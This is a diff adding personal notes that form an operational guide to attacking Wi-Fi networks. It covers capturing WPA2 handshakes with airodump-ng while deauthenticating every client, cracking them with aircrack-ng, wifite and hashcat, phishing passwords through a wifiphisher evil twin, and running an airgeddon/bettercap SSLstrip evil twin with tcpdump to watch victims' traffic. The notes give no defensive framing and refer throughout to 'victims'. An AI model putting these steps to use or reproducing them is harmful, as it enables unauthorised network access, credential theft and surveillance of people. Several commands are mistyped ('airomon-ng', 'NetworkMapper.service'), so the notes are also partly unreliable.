@@ -1,0 +1,208 @@
+->wifi hacking 
+
+->wpa2 using alpha awus 
+
+start:
+-> download any pkgs in kali that your wifi adapter supports.
+
+-> connect the wifi adapter in the port (check in which one it will support, try different)
+
+-> go to wifi in host machine, connect to the internet using wifi2 (which will come after you connect wifi adapter)
+
+-> virtual box > connect to NAT (to use network from your host machine) > USB protocol 2/3 depending on wifi adapter you are using (I use 3 generally)
+
+-> start kali > on top > devices > network > connect to network adapter > usb > select the chipset your wifi adapter is using 
+
+-> ifconfig -> wifi adapter interface wlan0 will show
+
+-> iwconfig -> will give the configuration of wlan0 you are using 
+
+-> now we need to start monitor, before that we need to kill any conflicting processes
+> sudo airmon-ng check kill
+> sudo airmon-ng start wlan0
+
+now we are in monitor mode 
+
+
+-> get the list of wifi interfaces to hack
+> sudo airodump-ng wlan0
+
+
+-> now we need to capture the handskae in cap file, also will show the clients connected to this wifi interface 
+sudo airodump-ng -w [cap2012] -c [1] --bssid [6C:4C:BC:23:7A:AF] wlan0
+
+
+-> keep the previous command running, and start sending deauth packets to every devices that are connected (and don't stop sending)
+sudo aireplay-ng --deauth 0 -a [6C:4C:BC:23:7A:AF] wlan0
+
+
+
+-> now check the previous terminal, at the top right , you have captured a handshake when any of the clients tried to connect back.
+
+-> stop both the processes
+
+-> check the .cap file in your system and open it 
+ > wireshark [cap2012.cap]
+> protol search : eapol
+we need to check the wifi authenticating the client, there will be many wifi to client (you can see the one packet with the larger length).
+there unsed 801 Authentication header, will be WPA key data, that is the password, we need to crack it 
+
+-> now you can disable your monitor mode as we don't need it now 
+
+crack using bruteforce:
+> sudo aircrack-ng [capfile] -w [wordlist]
+
+
+
+
+
+
+
+-------------------------->instead of air-ng tools, you can also use wifite
+
+> sudo wife ---------> to enable monitor mode and get the wifi interfaces at once 
+ctrl+c
+enter the no of wifi interface you wanT to attack
+it will first try to crack PMKID (you will get the password), 
+if taking much time, ctrl+c, and continue attack:
+now it will deauth the clients and capture handshake to get the password 
+
+it is a automated process unlike air-ng tools 
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------> cracking passwords using hashcat (both the eapol and PMKID hashes are in same file)
+> sudo apt update 
+> hcxdumptool
+> hcxpcapngtool
+
+-> stop all the services accessing the wifi network:
+
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+
+
+-> Dump the network traffic from all the wifi interfaces currently in the range, let it run for some time
+
+> sudo hcxdumptool -i wlan0 -w [dumpfile.pcapng] -F --rds=1
+(also copy the MAC addr/bssid of the network you want to attack, copy that and save it for later)
+
+> ls  ->see the pcap file
+
+
+-> start the services agin as the monitor part is done 
+
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+
+
+-> convert the pcapng file into the format that hashcat understands  (-E outputs the wifi interface name)
+> hcxpcapngtool -o [hash] -E [essidlist] dumpfile.pcapng
+(open the hash file in the editor and search for the required bssid, remove the rest of the hashes)
+
+
+-> now crack the hash that we had captured from the pcapng file (mode 22000 is for wpa and wpa2 hash cracking)
+> hashcat -m 22000 [hash] wordlist.txt
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------> Evil twin using Wifiphisher hacking wifi by phishing (wifiphisher)
+
+> sudo apt install wifiphisher 
+> sudo airomon-ng check kill
+> sudo systemctl stop NetworkMapper.service
+
+----> turn your wifi adapter into a wifi access point (keep it in managed mode only)
+> sudo wifiphisher -nD -i wlan0 -e "[name_of_fake_wifi_access_point]"  --force-hostapd ------> nD no deauth , else you require 2 wifi adapters 
+
+> use oAuth/Firmware 
+-> when the victim tries to connect to this AP, he will visit the login page and enter the creds, we will get those creds 
+
+> iwconfig ------------> now you will see that interface wlan0 is in managed mode and the other on is added by default (wfphshr) that is in monitor mode 
+
+
+---> if not able to see fake acces spoint or victim not able to connect to it, then remove the wifi adapter and perform again.
+
+
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------------------> to track the user activity also (the victim actually gets internet from our rouge access point)
+
+--------------> using airgeddon with bettercap
+SSLstrip/Bettercap: it is a specific attack variant designed to downgrade HTTPS connections to HTTP in an attempt to capture encrypted traffic in plaintext (but modern applictions use HSTS which are harder to downgrade)
+
+> sudo airomon-ng check kill
+> sudo systemctl stop NetworkMapper.service
+
+> git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+> cd airgeddon
+> sudo airomon-ng start wlan0
+> sudo bash airgeddon.sh
+
+-> select evil twin
+-> select evil twin with bettercap/sslstrip2
+
+
+--> now anther window opens and will start to scan for bssids, once the target one is in the list click on that window and ctrl+c
+now those will come on the main screen, 
+
+> select the target wifi interface 
+
+> select the attack (deauth replay)
+to provide victim access to internet use your eth0 interface 
+
+> 5 other windows will open and when the victim connects to the fake AP, you will see that
+
+
+
+
+> sudo tcpdump -i wlan0 -A       ---------> to see all the traffic of victims device that he is browsing or doing 
+or
+> sudo tcpdump -i wlan0 -w capture.pcap
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------------------------------------------------------------> WPA3 ATTACKS
+
+
+
+
+
+
+
+
+
+
+
